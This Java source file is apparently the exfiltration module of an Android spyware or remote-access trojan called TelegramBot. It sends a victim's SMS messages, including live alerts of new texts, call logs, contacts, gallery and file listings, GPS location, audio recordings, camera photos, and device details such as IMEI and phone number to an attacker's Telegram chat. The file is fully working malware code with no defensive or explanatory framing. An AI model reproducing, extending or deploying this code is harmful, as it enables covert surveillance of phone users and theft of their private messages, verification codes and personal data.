package com.my.luck.network;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class TelegramBot {
    private static final String TAG = "TelegramBot";
    private static final String API_URL = "https://api.telegram.org/bot";
    private String botToken;
    private String ownerId;
    private Context context;

    public TelegramBot(Context context, String botToken, String ownerId) {
        this.context = context;
        this.botToken = botToken;
        this.ownerId = ownerId;
    }

    // ============================================
    // 📤 SEND MESSAGE
    // ============================================

    public void sendMessage(String message) {
        new Thread(() -> {
            try {
                String urlString = API_URL + botToken + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject payload = new JSONObject();
                payload.put("chat_id", ownerId);
                payload.put("text", message);
                payload.put("parse_mode", "HTML");

                DataOutputStream out = new DataOutputStream(conn.getOutputStream());
                out.writeBytes(payload.toString());
                out.flush();
                out.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "Message sent successfully");
                } else {
                    Log.e(TAG, "Failed to send message: " + responseCode);
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending message", e);
            }
        }).start();
    }

    // ============================================
    // 📤 SEND FILE (Document)
    // ============================================

    public void sendFile(String filePath, String caption) {
        new Thread(() -> {
            try {
                String boundary = "*****";
                String lineEnd = "\r\n";
                String twoHyphens = "--";

                URL url = new URL(API_URL + botToken + "/sendDocument");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setDoInput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                // Chat ID
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.writeBytes(ownerId + lineEnd);

                // Caption
                if (caption != null && !caption.isEmpty()) {
                    dos.writeBytes(twoHyphens + boundary + lineEnd);
                    dos.writeBytes("Content-Disposition: form-data; name=\"caption\"" + lineEnd);
                    dos.writeBytes(lineEnd);
                    dos.writeBytes(caption + lineEnd);
                }

                // File
                File file = new File(filePath);
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"" + lineEnd);
                dos.writeBytes(lineEnd);

                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }
                fis.close();
                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                dos.flush();
                dos.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "File sent: " + filePath);
                } else {
                    Log.e(TAG, "Failed to send file: " + responseCode);
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending file", e);
            }
        }).start();
    }

    // ============================================
    // 📤 SEND PHOTO
    // ============================================

    public void sendPhoto(String photoPath, String caption) {
        new Thread(() -> {
            try {
                String boundary = "*****";
                String lineEnd = "\r\n";
                String twoHyphens = "--";

                URL url = new URL(API_URL + botToken + "/sendPhoto");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setDoInput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.writeBytes(ownerId + lineEnd);

                if (caption != null && !caption.isEmpty()) {
                    dos.writeBytes(twoHyphens + boundary + lineEnd);
                    dos.writeBytes("Content-Disposition: form-data; name=\"caption\"" + lineEnd);
                    dos.writeBytes(lineEnd);
                    dos.writeBytes(caption + lineEnd);
                }

                File file = new File(photoPath);
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + file.getName() + "\"" + lineEnd);
                dos.writeBytes(lineEnd);

                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }
                fis.close();
                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                dos.flush();
                dos.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "Photo sent: " + photoPath);
                } else {
                    Log.e(TAG, "Failed to send photo: " + responseCode);
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending photo", e);
            }
        }).start();
    }

    // ============================================
    // 📱 SMS FEATURES
    // ============================================

    public void sendSmsList(List<Map<String, String>> smsList) {
        StringBuilder sb = new StringBuilder();
        sb.append("📱 <b>SMS DUMP</b>\n");
        sb.append("━━━━━━━━━━━━━━━\n");
        sb.append("📊 Total: ").append(smsList.size()).append(" messages\n");
        sb.append("━━━━━━━━━━━━━━━\n\n");
        
        int count = 0;
        for (Map<String, String> sms : smsList) {
            if (count++ > 30) break;
            sb.append("📌 <b>From:</b> ").append(sms.get("address")).append("\n");
            sb.append("📝 <b>Message:</b> ").append(sms.get("body")).append("\n");
            sb.append("🕐 <b>Time:</b> ").append(sms.get("date")).append("\n");
            sb.append("━━━━━━━━━━━━━━━\n");
        }
        if (smsList.size() > 30) {
            sb.append("\n... and ").append(smsList.size() - 30).append(" more messages");
        }
        sendMessage(sb.toString());
    }

    public void alertNewSms(String sender, String body) {
        String alert = "🔴 <b>NEW SMS RECEIVED</b>\n";
        alert += "━━━━━━━━━━━━━━━\n";
        alert += "📌 <b>From:</b> " + sender + "\n";
        alert += "📝 <b>Message:</b> " + body + "\n";
        alert += "🕐 " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
        sendMessage(alert);
    }

    // ============================================
    // 📞 CALL LOG FEATURES
    // ============================================

    public void sendCallLogList(List<Map<String, String>> callLog) {
        StringBuilder sb = new StringBuilder();
        sb.append("📞 <b>CALL LOG DUMP</b>\n");
        sb.append("━━━━━━━━━━━━━━━\n");
        sb.append("📊 Total: ").append(callLog.size()).append(" calls\n");
        sb.append("━━━━━━━━━━━━━━━\n\n");
        
        int count = 0;
        for (Map<String, String> call : callLog) {
            if (count++ > 30) break;
            String icon = call.get("type").equals("INCOMING") ? "📥" : 
                          call.get("type").equals("OUTGOING") ? "📤" : "❌";
            sb.append(icon).append(" <b>").append(call.get("name") != null ? call.get("name") : "Unknown").append("</b>\n");
            sb.append("📞 <b>Number:</b> ").append(call.get("number")).append("\n");
            sb.append("⏱️ <b>Duration:</b> ").append(call.get("duration")).append("s\n");
            sb.append("🕐 <b>Time:</b> ").append(call.get("date")).append("\n");
            sb.append("━━━━━━━━━━━━━━━\n");
        }
        if (callLog.size() > 30) {
            sb.append("\n... and ").append(callLog.size() - 30).append(" more calls");
        }
        sendMessage(sb.toString());
    }

    // ============================================
    // 👤 CONTACTS FEATURES
    // ============================================

    public void sendContactsList(List<Map<String, String>> contacts) {
        StringBuilder sb = new StringBuilder();
        sb.append("👤 <b>CONTACTS DUMP</b>\n");
        sb.append("━━━━━━━━━━━━━━━\n");
        sb.append("📊 Total: ").append(contacts.size()).append(" contacts\n");
        sb.append("━━━━━━━━━━━━━━━\n\n");
        
        int count = 0;
        for (Map<String, String> contact : contacts) {
            if (count++ > 50) break;
            sb.append("👤 <b>Name:</b> ").append(contact.get("name")).append("\n");
            sb.append("📞 <b>Number:</b> ").append(contact.get("number")).append("\n");
            sb.append("━━━━━━━━━━━━━━━\n");
        }
        if (contacts.size() > 50) {
            sb.append("\n... and ").append(contacts.size() - 50).append(" more contacts");
        }
        sendMessage(sb.toString());
    }

    // ============================================
    // 📂 FILE DUMP FEATURES
    // ============================================

    public void sendFileList(List<String> files, String type) {
        StringBuilder sb = new StringBuilder();
        sb.append("📂 <b>").append(type).append(" DUMP</b>\n");
        sb.append("━━━━━━━━━━━━━━━\n");
        sb.append("📊 Total: ").append(files.size()).append(" files\n");
        sb.append("━━━━━━━━━━━━━━━\n\n");
        
        int count = 0;
        for (String file : files) {
            if (count++ > 20) break;
            File f = new File(file);
            sb.append("📄 <b>").append(f.getName()).append("</b>\n");
            sb.append("📁 ").append(file).append("\n");
            sb.append("📦 Size: ").append(formatSize(f.length())).append("\n");
            sb.append("━━━━━━━━━━━━━━━\n");
        }
        if (files.size() > 20) {
            sb.append("\n... and ").append(files.size() - 20).append(" more files");
        }
        sendMessage(sb.toString());
    }

    public void sendGalleryFiles(List<String> images) {
        StringBuilder sb = new StringBuilder();
        sb.append("🖼️ <b>GALLERY DUMP</b>\n");
        sb.append("━━━━━━━━━━━━━━━\n");
        sb.append("📊 Total: ").append(images.size()).append(" images\n");
        sb.append("━━━━━━━━━━━━━━━\n\n");
        
        int count = 0;
        for (String image : images) {
            if (count++ > 20) break;
            File f = new File(image);
            sb.append("🖼️ <b>").append(f.getName()).append("</b>\n");
            sb.append("📁 ").append(image).append("\n");
            sb.append("📦 Size: ").append(formatSize(f.length())).append("\n");
            sb.append("━━━━━━━━━━━━━━━\n");
        }
        if (images.size() > 20) {
            sb.append("\n... and ").append(images.size() - 20).append(" more images");
        }
        sendMessage(sb.toString());
    }

    // ============================================
    // 📍 LOCATION FEATURES
    // ============================================

    public void sendLocation(double latitude, double longitude, String address) {
        String msg = "📍 <b>LOCATION</b>\n";
        msg += "━━━━━━━━━━━━━━━\n";
        msg += "🗺️ <b>Latitude:</b> " + latitude + "\n";
        msg += "🗺️ <b>Longitude:</b> " + longitude + "\n";
        if (address != null && !address.isEmpty()) {
            msg += "🏠 <b>Address:</b> " + address + "\n";
        }
        msg += "🕐 " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
        sendMessage(msg);
    }

    // ============================================
    // 🎤 AUDIO FEATURES
    // ============================================

    public void sendAudioFile(String audioPath) {
        sendFile(audioPath, "🎤 Audio Recording");
    }

    // ============================================
    // 📷 CAMERA FEATURES
    // ============================================

    public void sendPhotoFile(String photoPath) {
        sendPhoto(photoPath, "📷 Captured Photo");
    }

    // ============================================
    // 📶 DEVICE CONTROL FEATURES
    // ============================================

    public void sendDeviceControlStatus(String action, boolean status) {
        String msg = "🔧 <b>DEVICE CONTROL</b>\n";
        msg += "━━━━━━━━━━━━━━━\n";
        msg += "⚡ <b>Action:</b> " + action + "\n";
        msg += "📊 <b>Status:</b> " + (status ? "✅ ON" : "❌ OFF") + "\n";
        msg += "🕐 " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
        sendMessage(msg);
    }

    // ============================================
    // 💻 DEVICE INFO
    // ============================================

    public void sendDeviceInfo() {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        
        String info = "🖥️ <b>DEVICE CONNECTED</b>\n";
        info += "━━━━━━━━━━━━━━━\n";
        info += "📱 <b>Model:</b> " + Build.MODEL + "\n";
        info += "🏷️ <b>Brand:</b> " + Build.BRAND + "\n";
        info += "📡 <b>Android:</b> " + Build.VERSION.RELEASE + "\n";
        info += "🔢 <b>SDK:</b> " + Build.VERSION.SDK_INT + "\n";
        info += "📶 <b>IMEI:</b> " + (tm != null ? tm.getDeviceId() : "N/A") + "\n";
        info += "📞 <b>Number:</b> " + (tm != null ? tm.getLine1Number() : "N/A") + "\n";
        info += "📶 <b>Network:</b> " + (tm != null ? tm.getNetworkOperatorName() : "N/A") + "\n";
        info += "🔋 <b>Battery:</b> " + getBatteryLevel() + "%\n";
        info += "💾 <b>Storage:</b> " + getStorageInfo() + "\n";
        info += "🕐 <b>Time:</b> " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
        sendMessage(info);
    }

    // ============================================
    // 🔧 HELPER FUNCTIONS
    // ============================================

    private String formatSize(long size) {
        if (size < 1024) return size + " B";
        if (size < 1024 * 1024) return String.format("%.1f KB", size / 1024.0);
        if (size < 1024 * 1024 * 1024) return String.format("%.1f MB", size / (1024.0 * 1024.0));
        return String.format("%.1f GB", size / (1024.0 * 1024.0 * 1024.0));
    }

    private int getBatteryLevel() {
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
            return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Exception e) {
            return -1;
        }
    }

    private String getStorageInfo() {
        try {
            android.os.StatFs stat = new android.os.StatFs(android.os.Environment.getDataDirectory().getPath());
            long bytesAvailable = (long) stat.getBlockSizeLong() * (long) stat.getAvailableBlocksLong();
            long bytesTotal = (long) stat.getBlockSizeLong() * (long) stat.getBlockCountLong();
            return formatSize(bytesAvailable) + " / " + formatSize(bytesTotal);
        } catch (Exception e) {
            return "Unknown";
        }
    }
}